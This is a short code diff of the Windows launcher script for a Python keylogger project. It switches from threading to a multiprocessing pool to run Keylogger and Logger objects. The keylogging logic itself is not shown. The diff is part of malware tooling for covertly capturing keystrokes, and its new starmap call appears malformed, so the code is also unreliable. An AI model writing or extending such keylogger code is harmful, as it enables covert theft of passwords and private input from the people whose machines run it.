@@ -1,17 +1,16 @@
-from keylogger import Keylogger
-# from logger import Logger
-import configparser
-import threading
-import time
+from multiprocessing import Pool
+import logging
 import os
 
-# config = configparser.ConfigParser()
+from keylogger import Keylogger
+from logger import Logger
 
-# https://www.branah.com/
 
 if __name__ == "__main__":
+  if os.name == "nt":
     keylogger = Keylogger()
-    # logger = Logger()
-    if os.name == "nt":
-        threading.Thread(target=keylogger).start()
-        # threading.Thread(target=logger).start()
+    logger = Logger()
+    with Pool(processes=2) as pool:
+      pool.starmap(keylogger, logger)
+  else:
+    logging.exception("Unsupported OS.")
